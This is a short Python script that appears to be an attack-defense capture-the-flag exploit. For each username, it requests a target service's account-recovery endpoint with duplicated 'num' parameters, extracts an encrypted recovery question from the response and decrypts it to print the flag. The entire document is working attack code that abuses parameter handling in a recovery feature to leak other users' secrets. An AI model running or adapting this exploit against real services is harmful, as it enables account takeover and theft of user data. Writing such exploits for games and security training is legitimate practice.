from sys import argv
from typing import List
from requests import get
from hashlib import sha256
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from re import findall
from utils import decrypt, REGEX_QUESTION_QUESTION, PORT

# Checker is configured with:  flag_id_types = ['username', 'username']

def exploit(target: str, flag_ids_username: List[str]):

    for flag_id in flag_ids_username:
        print(f"Attacking {flag_id}")
        
        resp = get(f"http://{target}:{PORT}/users/recover/?username={flag_id}&num=1&num=0")
        question_question = findall(REGEX_QUESTION_QUESTION, resp.text)[0]
        print(decrypt(question_question, flag_id)) # flag

if __name__ == '__main__':
    exploit(argv[1], argv[2].split(',')) # Flag1 uses first list of flag_ids 